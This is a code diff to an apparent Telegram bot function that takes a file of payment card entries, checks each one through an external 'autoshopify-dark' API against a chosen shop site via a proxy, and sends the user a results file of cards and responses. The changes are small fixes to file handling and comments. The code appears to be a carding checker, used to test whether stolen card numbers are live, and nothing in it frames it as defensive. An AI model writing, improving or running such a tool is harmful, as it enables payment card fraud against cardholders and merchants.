@@ -4698,6 +4698,9 @@ os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
 async def process_cards(update: Update, file_path: str, file_name: str, site: str):
     output_file_path = os.path.join(DOWNLOAD_FOLDER, f"results_{file_name}")
 
+    # Always start with a clean empty file
+    open(output_file_path, "w", encoding="utf-8").close()
+
     async with aiohttp.ClientSession() as session:
         with open(file_path, "r", encoding="utf-8") as f:
             cards = [line.strip() for line in f if line.strip()]
@@ -4714,7 +4717,7 @@ async def process_cards(update: Update, file_path: str, file_name: str, site: st
                 api_url = f"https://autoshopify-dark.sevalla.app/index.php?site={site}&cc={card}&proxy={PROXY}"
                 print(f"🔎 Checking: {card}")
 
-                response_text = "No Response"  # default
+                response_text = "No Response"
                 try:
                     async with session.get(api_url, timeout=30) as resp:
                         try:
@@ -4726,7 +4729,6 @@ async def process_cards(update: Update, file_path: str, file_name: str, site: st
                 except Exception as e:
                     response_text = f"Request Error: {e}"
 
-                # Debug: log what we are writing
                 line = f"{card} => {response_text}\n"
                 print("📝 Writing line:", line)
 
@@ -4736,6 +4738,7 @@ async def process_cards(update: Update, file_path: str, file_name: str, site: st
 
         await asyncio.gather(*(check_card(card) for card in cards))
 
+    # Send only if file has real content
     if os.path.exists(output_file_path) and os.path.getsize(output_file_path) > 0:
         print("📄 Sending result file:", output_file_path)
         await update.message.reply_document(
@@ -4749,6 +4752,7 @@ async def process_cards(update: Update, file_path: str, file_name: str, site: st
         os.remove(output_file_path)
     except Exception as e:
         print("⚠️ Cleanup error:", e)
+
 
 
 # ---------------- Unified handler ---------------- #
